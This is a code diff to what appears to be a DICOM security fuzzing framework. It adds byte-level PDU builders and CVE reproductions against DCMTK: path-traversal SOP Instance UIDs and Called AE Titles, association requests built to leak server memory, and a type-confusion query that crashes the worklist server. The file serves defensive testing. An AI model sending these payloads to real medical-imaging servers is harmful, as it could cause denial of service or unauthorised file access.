+        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
             yield cls.patient_name_traversal(pid)
 
 
@@ -1543,6 +2118,156 @@ class StateMachineAttacks:
 # CVE Attacks - CVE-specific reproductions
 # =============================================================================
 
+ICSMA_26_181_01 = 'ICSMA-26-181-01'
+
+
+def _ae_title_bytes(value: str) -> bytes:
+    return value.encode('ascii', 'replace')[:16].ljust(16, b' ')
+
+
+def _item_bytes(item_type: int, payload: bytes) -> bytes:
+    return bytes([item_type, 0]) + struct.pack('!H', len(payload)) + payload
+
+
+def _presentation_context_bytes(abstract_syntax_uid: str,
+                                transfer_syntax_uid: str = DEFAULT_TRANSFER_SYNTAX_UID,
+                                context_id: int = 1) -> bytes:
+    payload = bytes([context_id, 0, 0, 0])
+    payload += _item_bytes(0x30, abstract_syntax_uid.encode('ascii'))
+    payload += _item_bytes(0x40, transfer_syntax_uid.encode('ascii'))
+    return _item_bytes(0x20, payload)
+
+
+def _user_information_bytes(payload: Optional[bytes] = None) -> bytes:
+    if payload is None:
+        payload = _item_bytes(0x51, struct.pack('!I', 16384))
+        payload += _item_bytes(0x52, IMPLEMENTATION_CLASS_UID.encode('ascii'))
+    return _item_bytes(0x50, payload)
+
+
+def _associate_rq_with_items(called_ae: str,
+                             calling_ae: str,
+                             variable_items: bytes) -> bytes:
+    body = b'\x00\x01\x00\x00'
+    body += _ae_title_bytes(called_ae)
+    body += _ae_title_bytes(calling_ae)
+    body += b'\x00' * 32
+    body += variable_items
+    return b'\x01\x00' + struct.pack('!I', len(body)) + body
+
+
+def _associate_rq_bytes(called_ae: str,
+                        calling_ae: str,
+                        abstract_syntax_uid: str,
+                        user_info_payload: Optional[bytes] = None,
+                        context_id: int = 1) -> bytes:
+    variable_items = _item_bytes(
+        0x10, b'1.2.840.10008.3.1.1.1')
+    variable_items += _presentation_context_bytes(
+        abstract_syntax_uid, context_id=context_id)
+    variable_items += _user_information_bytes(user_info_payload)
+    return _associate_rq_with_items(called_ae, calling_ae, variable_items)
+
+
+def _release_rq_bytes() -> bytes:
+    return b'\x05\x00\x00\x00\x00\x04\x00\x00\x00\x00'
+
+
+def _cfind_pdata_bytes(identifier: Dataset,
+                       sop_class_uid: str = MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+                       message_id: int = 1) -> bytes:
+    identifier_bytes = identifier.encode()
+    if not SCAPY_AVAILABLE:
+        body = b'\x00\x00\x00\x00' + identifier_bytes
+        return b'\x04\x00' + struct.pack('!I', len(body)) + body
+
+    cmd = C_FIND_RQ(
+        affected_sop_class_uid=sop_class_uid,
+        message_id=message_id,
+        priority=0x0000,
+    )
+    cmd_pdv = PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=1,
+        data=raw(cmd),
+    )
+    data_pdv = PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=0,
+        data=identifier_bytes,
+    )
+    return raw(DICOM() / P_DATA_TF(pdv_items=[cmd_pdv, data_pdv]))
+
+
+def _cstore_pdata_bytes(dataset: Optional[bytes],
+                        sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
+                        sop_instance_uid: str = '1.2.3.4.5',
+                        message_id: int = 1,
+                        priority: int = 0x0002,
+                        data_set_type: int = 0x0000,
+                        move_originator_ae_title: Optional[str] = None,
+                        move_originator_message_id: Optional[int] = None) -> bytes:
+    if not SCAPY_AVAILABLE:
+        body = b'\x00\x00\x00\x00' + (dataset or b'')
+        return b'\x04\x00' + struct.pack('!I', len(body)) + body
+
+    kwargs = {
+        'affected_sop_class_uid': sop_class_uid,
+        'affected_sop_instance_uid': sop_instance_uid,
+        'message_id': message_id,
+        'priority': priority,
+        'data_set_type': data_set_type,
+    }
+    if move_originator_ae_title is not None:
+        kwargs['move_originator_ae_title'] = move_originator_ae_title
+    if move_originator_message_id is not None:
+        kwargs['move_originator_message_id'] = move_originator_message_id
+
+    cmd = C_STORE_RQ(**kwargs)
+    pdv_items = [PresentationDataValueItem(
+        context_id=1,
+        is_last=1,
+        is_command=1,
+        data=raw(cmd),
+    )]
+    if dataset is not None:
+        pdv_items.append(PresentationDataValueItem(
+            context_id=1,
+            is_last=1,
+            is_command=0,
+            data=dataset,
+        ))
+    return raw(DICOM() / P_DATA_TF(pdv_items=pdv_items))
+
+
+def _cstore_sequence_bytes(dataset: Optional[bytes], **kwargs) -> Tuple[bytes, List[bytes]]:
+    assoc = _associate_rq_bytes(
+        'STORESCP', 'C-SCARE-FZ',
+        kwargs.get('sop_class_uid', SECONDARY_CAPTURE_SOP_CLASS_UID))
+    pdata = _cstore_pdata_bytes(dataset, **kwargs)
+    release = _release_rq_bytes()
+    steps = [assoc, pdata, release]
+    return b''.join(steps), steps
+
+
+def _icsma_metadata(cve: str,
+                    cwe: str,
+                    blackbox_driver: str,
+                    greybox_driver: str,
+                    target: str) -> Dict[str, Any]:
+    return {
+        'cve': cve,
+        'advisory': ICSMA_26_181_01,
+        'cwe': cwe,
+        'coverage_mode': 'both',
+        'blackbox_driver': blackbox_driver,
+        'greybox_driver': greybox_driver,
+        'target': target,
+    }
+
+
 class CVEAttacks:
     """
     CVE-specific test cases organized by CVE number.
@@ -1550,7 +2275,7 @@ class CVEAttacks:
     Each method generates one or more AttackResult objects that reproduce
     the conditions described in the CVE.
     """
-    
+
     # -------------------------------------------------------------------------
     # CVE-2023-32135: Use-After-Free in DCM File Parsing
     # -------------------------------------------------------------------------
@@ -1621,6 +2346,226 @@ class CVEAttacks:
         ))
         
         return results
+
+    # -------------------------------------------------------------------------
+    # ICSMA-26-181-01: OFFIS DCMTK Toolkit <= 3.7.0
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_50003_cget_bit_preserving_path_traversal() -> List[AttackResult]:
+        """
+        CVE-2026-50003: a hostile C-GET SCP can make a DCMTK client using
+        bit-preserving storage write outside the selected output directory.
+        """
+        results = []
+        payloads = [
+            ('relative', '../../outside-cget/c-scare-cget.dcm'),
+            ('absolute', '/tmp/c-scare-cget/escaped.dcm'),
+        ]
+        for payload_id, path_value in payloads:
+            ds = _injection_base_dataset()
+            ds[0x00080018] = Element(0x0008, 0x0018, 'UI', path_value)
+            metadata = _icsma_metadata(
+                'CVE-2026-50003',
+                'CWE-22',
+                'rogue C-GET SCP feeding a DCMTK client in bit-preserving '
+                'storage mode',
+                'instrumented C-GET SCU/client-response harness seeded with '
+                'path-bearing C-STORE sub-operations',
+                'DCMTK C-GET client',
+            )
+            metadata.update({
+                'target_role': 'scu-client',
+                'delivery': 'hostile-cget-cstore',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'traversal_payload': path_value,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': path_value,
+            })
+            results.append(AttackResult(
+                name=f'cve_2026_50003_cget_bit_preserving_{payload_id}',
+                category='cve',
+                payload=ds.encode(),
+                description='C-GET C-STORE sub-operation carries a path-like '
+                            f'SOP Instance UID ({payload_id})',
+                expected_behavior='Client must confine bit-preserved output to '
+                                  'the selected storage directory',
+                metadata=metadata,
+            ))
+        return results
+
+    @staticmethod
+    def cve_2026_50254_storescp_association_leak() -> List[AttackResult]:
+        """CVE-2026-50254: repeated crafted connection requests leak memory
+        in storescp single-process mode."""
+        malformed_max_length = _item_bytes(0x51, b'')
+        payload = _associate_rq_bytes(
+            'STORESCP',
+            'C-SCARE-FZ',
+            CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            user_info_payload=malformed_max_length,
+        )
+        metadata = _icsma_metadata(
+            'CVE-2026-50254',
+            'CWE-401',
+            'repeat this single A-ASSOCIATE-RQ against a live storescp and '
+            'watch RSS/availability',
+            'AFLNet net-storescp with LSan triage and --include-queue leak '
+            'replays',
+            'storescp',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'raw-pdu',
+            'repeat_for_detection': 1000,
+            'expected_monitor': 'memory-growth-or-lsan',
+        })
+        return [AttackResult(
+            name='cve_2026_50254_storescp_assoc_leak_truncated_max_length',
+            category='cve',
+            payload=payload,
+            description='storescp association request with a malformed Maximum '
+                        'Length user-information sub-item',
+            expected_behavior='storescp must reject the association and release '
+                              'all per-request allocations',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_35505_association_request_leak() -> List[AttackResult]:
+        """CVE-2026-35505: repeated crafted connection requests leak memory
+        until a single-process service is killed."""
+        duplicate_max_length = _item_bytes(0x51, struct.pack('!I', 0))
+        duplicate_max_length += _item_bytes(0x51, struct.pack('!I', 0xFFFFFFFF))
+        payload = _associate_rq_bytes(
+            'DCMQRSCP',
+            'C-SCARE-FZ',
+            VERIFICATION_SOP_CLASS_UID,
+            user_info_payload=duplicate_max_length,
+        )
+        metadata = _icsma_metadata(
+            'CVE-2026-35505',
+            'CWE-401',
+            'repeat crafted A-ASSOCIATE-RQ against the affected single-process '
+            'DCMTK SCP and watch RSS/availability',
+            'AFLNet network SCP profile with LSan triage and queue replay for '
+            'leak-only findings',
+            'DCMTK single-process SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'raw-pdu',
+            'repeat_for_detection': 1000,
+            'expected_monitor': 'memory-growth-or-lsan',
+        })
+        return [AttackResult(
+            name='cve_2026_35505_assoc_leak_duplicate_max_length',
+            category='cve',
+            payload=payload,
+            description='Association request carries duplicate Maximum Length '
+                        'sub-items with conflicting values',
+            expected_behavior='SCP must reject or normalize the association and '
+                              'release all per-request allocations',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_52868_worklist_directory_escape() -> List[AttackResult]:
+        """CVE-2026-52868: worklist query escapes the intended per-AE
+        worklist storage area."""
+        identifier = Dataset()
+        identifier = identifier / Element(0x0008, 0x0050, 'SH', '')
+        identifier = identifier / Element(0x0010, 0x0010, 'PN', '')
+        identifier = identifier / Element(0x0010, 0x0020, 'LO', '')
+        assoc = _associate_rq_bytes(
+            '../ORTHO',
+            'C-SCARE-FZ',
+            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        )
+        pdata = _cfind_pdata_bytes(identifier)
+        release = _release_rq_bytes()
+        metadata = _icsma_metadata(
+            'CVE-2026-52868',
+            'CWE-22',
+            'C-FIND against a worklist SCP configured with multiple per-AE '
+            'storage areas, using a traversal-shaped Called AE Title',
+            'future AFLNet net-dcmwlm/worklist profile with per-AE directory '
+            'fixtures and response-diff oracle',
+            'DCMTK worklist SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'dicom-cfind-sequence',
+            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+            'called_ae_title': '../ORTHO',
+            'greybox_prerequisite': 'add an instrumented worklist SCP target '
+                                    'profile; net-dcmqrscp is not a worklist '
+                                    'server',
+            'steps': [assoc, pdata, release],
+        })
+        return [AttackResult(
+            name='cve_2026_52868_worklist_called_ae_traversal',
+            category='cve',
+            payload=assoc + pdata + release,
+            description='Modality Worklist C-FIND uses a traversal-shaped '
+                        'Called AE Title to probe per-AE directory isolation',
+            expected_behavior='Worklist SCP must not return records outside '
+                              'the Called AE Title storage area',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_44628_worklist_type_confusion() -> List[AttackResult]:
+        """CVE-2026-44628: crafted worklist query can crash the worklist
+        server when normal storage/lockfile/record preconditions exist."""
+        identifier = Dataset()
+        identifier = identifier / Element(0x0008, 0x0060, 'CS', 'CT')
+        identifier = identifier / Element(0x0010, 0x0010, 'PN', '*')
+        identifier = identifier / Element(0x0040, 0x0100, 'LO', 'not-a-sequence')
+        assoc = _associate_rq_bytes(
+            'WORKLIST',
+            'C-SCARE-FZ',
+            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        )
+        pdata = _cfind_pdata_bytes(identifier, message_id=2)
+        release = _release_rq_bytes()
+        metadata = _icsma_metadata(
+            'CVE-2026-44628',
+            'CWE-843',
+            'single C-FIND against a seeded worklist SCP with valid Called AE, '
+            'storage directory, lockfile, and at least one matching record',
+            'future AFLNet net-dcmwlm/worklist profile with seeded records and '
+            'ASan/UBSan crash triage',
+            'DCMTK worklist SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'dicom-cfind-sequence',
+            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+            'called_ae_title': 'WORKLIST',
+            'target_field': '(0040,0100) Scheduled Procedure Step Sequence',
+            'type_confusion': 'SQ tag encoded as LO scalar',
+            'preconditions': [
+                'valid Called AE Title',
+                'configured worklist storage directory',
+                'expected lockfile exists',
+                'at least one matching worklist record',
+            ],
+            'greybox_prerequisite': 'add an instrumented worklist SCP target '
+                                    'profile; net-dcmqrscp is not a worklist '
+                                    'server',
+            'steps': [assoc, pdata, release],
+        })
+        return [AttackResult(
+            name='cve_2026_44628_worklist_sps_sequence_type_confusion',
+            category='cve',
+            payload=assoc + pdata + release,
+            description='Modality Worklist C-FIND encodes Scheduled Procedure '
+                        'Step Sequence as a scalar LO value',
+            expected_behavior='Worklist SCP must reject the mistyped key without '
+                              'crashing',
+            metadata=metadata,
+        )]
     
     # -------------------------------------------------------------------------
     # CVE-2024-24793: Use-After-Free in File Meta Information
@@ -2184,6 +3129,8 @@ class CVEAttacks:
             expected_behavior='Parser must bound nesting depth to avoid stack '
                               'exhaustion',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
+                      'transfer_syntax': '1.2.840.10008.1.2.1',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2208,6 +3155,8 @@ class CVEAttacks:
             expected_behavior='Parser must bound recursion regardless of '
                               'defined vs undefined length',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
+                      'transfer_syntax': '1.2.840.10008.1.2.1',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2241,6 +3190,7 @@ class CVEAttacks:
             expected_behavior='Parser must bound nesting depth before the stack '
                               'is exhausted',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2398,6 +3348,7 @@ class CVEAttacks:
             expected_behavior='Parser must null-check before dereferencing the '
                               'first sequence item',
             metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'null-deref'}
         ))
 
@@ -2421,13 +3372,14 @@ class CVEAttacks:
             expected_behavior='Codec must null-check the offset table / first '
                               'fragment',
             metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'null-deref'}
         ))
 
         return results
 
     # -------------------------------------------------------------------------
-    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString memory corruption
+    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString m
     # -------------------------------------------------------------------------
 
     @staticmethod
@@ -2460,6 +3412,7 @@ class CVEAttacks:
             expected_behavior='String normalisation must bound-check the declared '
                               'length',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2482,6 +3435,7 @@ class CVEAttacks:
                         'pad-to-even',
             expected_behavior='Padding logic must not write past the buffer',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2503,6 +3457,7 @@ class CVEAttacks:
             expected_behavior='String normalisation must bound-check the declared '
                               'length',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2557,6 +3512,7 @@ class CVEAttacks:
             expected_behavior='Renderer must validate bit fields before scanning '
                               'pixel min/max',
             metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'oob-write',
                       'target_func': 'determineMinMax'}
         ))
@@ -2572,6 +3528,7 @@ class CVEAttacks:
             expected_behavior='Renderer must bound the scan by the actual pixel '
                               'buffer length',
             metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'oob-write',
                       'target_func': 'determineMinMax'}
         ))
@@ -3060,6 +4017,7 @@ class CVEAttacks:
                 expected_behavior='dcmpstat must type-check (0028,3010) before '
                                   'casting to a sequence',
                 metadata={'cve': 'CVE-2024-28130', 'product': 'DCMTK',
+                          'delivery_hint': 'cstore',
                           'bug_class': 'type-confusion',
                           'target_func': 'DVPSSoftcopyVOI_PList::createFromImage',
                           'target_field': '(0028,3010) VOI LUT Sequence'}
@@ -3270,6 +4228,11 @@ class CVEAttacks:
         yield from cls.cve_2024_24793_duplicate_meta_tags()
         yield from cls.cve_2024_24794_sequence_duplicates()
         yield from cls.cve_2019_11687_polyglot()
+        yield from cls.cve_2026_50003_cget_bit_preserving_path_traversal()
+        yield from cls.cve_2026_50254_storescp_association_leak()
+        yield from cls.cve_2026_35505_association_request_leak()
+        yield from cls.cve_2026_52868_worklist_directory_escape()
+        yield from cls.cve_2026_44628_worklist_type_confusion()
         yield from cls.cve_2026_3650_gdcm_vr_memory_leak()
         yield from cls.cve_2026_5437_meta_header_oob()
         yield from cls.cve_2026_10528_dcmitem_read_stack()
